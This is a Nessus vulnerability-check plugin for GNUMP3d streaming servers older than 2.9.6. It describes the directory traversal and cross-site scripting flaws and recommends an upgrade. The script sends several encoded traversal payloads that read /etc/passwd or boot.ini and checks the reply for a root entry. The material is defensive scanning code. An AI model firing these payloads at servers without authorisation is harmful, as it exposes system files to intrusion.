#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote streaming server is prone to directory traversal and cross-
site scripting attacks. 

Description :

The remote host is running GNUMP3d, an open-source audio / video
streaming server. 

The installed version of GNUMP3d on the remote host suffers fails to
completely filter out directory traversal sequences from request URIs. 
By leveraging this flaw, an attacker can read arbitrary files on the
remote subject to the privileges under which the server operates.  In
addition, it fails to sanitize user-supplied input to several scripts,
which can be used to launch cross-site scripting attacks against the
affected application. 

See also :

http://savannah.gnu.org/cgi-bin/viewcvs/gnump3d/gnump3d/ChangeLog?rev=1.134&content-type=text/vnd.viewcvs-markup

Solution : 

Upgrade to GNUMP3d 2.9.7 or later.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:C)";


if (description) {
  script_id(20110);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-3123", "CVE-2005-3424", "CVE-2005-3425");
  script_bugtraq_id(15226, 15228, 15341);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"20359");
    script_xref(name:"OSVDB", value:"20360");
  }

  script_name(english:"GNUMP3d < 2.9.6 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in GNUMP3d < 2.9.6");
 
  script_description(english:desc);

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 3333, 8888);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:8888);
if (!get_port_state(port)) exit(0);


# Unless we're paranoid, make sure the banner looks like GNUMP3d.
if (report_paranoia < 2) {
  banner = get_http_banner(port:port);
  if (!banner || "Server: GNUMP3d " >!< banner) exit(0);
}


# Try to exploit the directory traversal flaw.
exploits = make_list(
  # should work up to 2.9.5 under Windows.
  "/..\..\..\..\..\..\..\..\..\boot.ini",
  # works in 2.9.3 under *nix.
  "/.//././/././/././/././/././/././/./etc/passwd",
  # should work in 2.9.1 - 2.9.2 under *nix, although apparently only if gnump3d's root directory is one level down from the root (eg, "/mp3s").
  "/....///....///....///....///....///....//....//....//etc/passwd",
  # should work w/ really old versions under *nix.
  urlencode(str:"/../../../../../../../etc/passwd")
);
foreach exploit (exploits) {
  req = http_get(item:exploit, port:port);
  res = http_send_recv(port:port, data:req);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
    if (report_verbosity > 0) {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        res
      );
    }
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
